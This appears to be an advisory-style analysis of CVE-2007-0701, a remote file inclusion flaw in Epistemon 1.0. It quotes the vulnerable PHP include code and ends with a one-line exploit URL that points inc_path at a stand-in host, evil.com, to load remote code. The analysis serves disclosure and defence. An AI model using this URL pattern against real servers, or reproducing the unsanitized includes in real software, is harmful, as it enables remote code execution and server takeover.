Based on the provided content, here's an analysis of the vulnerability:

**CVE ID:** CVE-2007-0701

**Root Cause of Vulnerability:**
The vulnerability is a Remote File Inclusion (RFI) flaw. It stems from the `common.inc.php` file in Epistemon 1.0 application, where the `$inc_path` variable is not properly sanitized and is used to include other files.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The application includes files based on user-supplied input via the `inc_path` parameter in the URL without proper sanitization. This allows an attacker to include a file from a remote location controlled by the attacker.
- **Lack of Input Sanitization:** The code fails to validate or sanitize the `$inc_path` parameter before using it in include statements.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** By including a malicious file from a remote server, an attacker can execute arbitrary PHP code on the vulnerable server. This can lead to complete compromise of the server, data theft, website defacement, and other malicious activities.
- **Information Disclosure:** An attacker could potentially include files to disclose sensitive information.

**Attack Vectors:**
- **HTTP GET Request:** The attacker sends a specially crafted HTTP GET request to the vulnerable script `common.inc.php`. The `inc_path` parameter is modified to include a URL pointing to a malicious file.
- **URL Manipulation:** The attacker modifies the `inc_path` parameter in the URL to point to a malicious file hosted on an attacker-controlled server.

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker must be able to send HTTP requests to the vulnerable server.
- **Knowledge of Vulnerable File Path:** The attacker needs to know the location of the vulnerable `common.inc.php` file.
- **Hosting Capabilities:** The attacker needs a web server to host the malicious file that will be included by the vulnerable script.

**Technical Details:**
The vulnerable code snippet from `/plateforme/code/inc/common.inc.php`:

```php
include($inc_path.'config.php');
include ($inc_path."i18n.inc.php");
include ($inc_path."const.inc.php")      ;
include ($inc_path."c_init.inc".$ext)     ;
include ($inc_path."c_chapitre.inc".$ext) ;
include ($inc_path."c_color.inc".$ext)    ;

include ($inc_path."c_connexion.inc".$ext);
include ($inc_path."c_file.inc".$ext)     ;
include ($inc_path."c_formation.inc".$ext);
include ($inc_path."c_groupe.inc".$ext)   ;
include ($inc_path."c_header.inc".$ext)   ;
include ($inc_path."c_mail.inc".$ext)     ;
include ($inc_path."c_membre.inc".$ext)   ;
include ($inc_path."c_webmail.inc".$ext)  ;
include ($inc_path."c_module.inc".$ext)   ;
include ($inc_path."c_mysql.inc".$ext)    ;
include ($inc_path."c_phorum.inc".$ext)   ;
include ($inc_path."c_tuteur.inc".$ext)   ;
include ($inc_path."c_document.inc".$ext) ;
include ($inc_path."html.inc".$ext)       ;
include ($inc_path."c_complement.inc".$ext);
```

**Exploit Example:**

```
http://www.hedef.com/[path]/plateforme/code/inc/common.inc.php?inc_path=http://evil.com/evil.txt
```

This URL would attempt to include the `evil.txt` file from `http://evil.com`, which could contain malicious PHP code.
